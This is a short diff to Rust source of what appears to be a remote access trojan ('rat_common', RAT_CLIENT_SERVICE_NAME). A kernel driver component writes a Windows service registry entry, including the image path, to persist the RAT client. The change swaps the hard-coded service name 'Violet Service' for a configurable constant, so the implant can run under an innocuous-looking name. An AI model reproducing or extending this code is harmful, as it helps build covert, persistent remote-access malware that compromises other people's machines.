@@ -4,7 +4,9 @@ use core::sync::atomic::Ordering;
 use core::{mem, ptr, slice};
 
 use aho_corasick::AhoCorasickBuilder;
+use const_format::formatcp;
 use rat_common::utils::DropGuard;
+use rat_common::windows::RAT_CLIENT_SERVICE_NAME;
 use rat_common::windows::kernel::KernelHandoff;
 use wdk::nt_success;
 use wdk_sys::_MODE::KernelMode;
@@ -88,13 +90,13 @@ fn setup_service_registry(path: &U16CStr) -> anyhow::Result<()> {
         registry::registry_write_string(
             key,
             u16cstr!("DisplayName"),
-            u16cstr!("Violet Service"),
+            u16cstr!(formatcp!("{RAT_CLIENT_SERVICE_NAME} Service")),
             REG_SZ,
         ),
         registry::registry_write_string(
             key,
             u16cstr!("Description"),
-            u16cstr!("Violet Service"),
+            u16cstr!(formatcp!("{RAT_CLIENT_SERVICE_NAME} Service")),
             REG_SZ,
         ),
         registry::registry_write_string(key, u16cstr!("ImagePath"), path, REG_EXPAND_SZ),
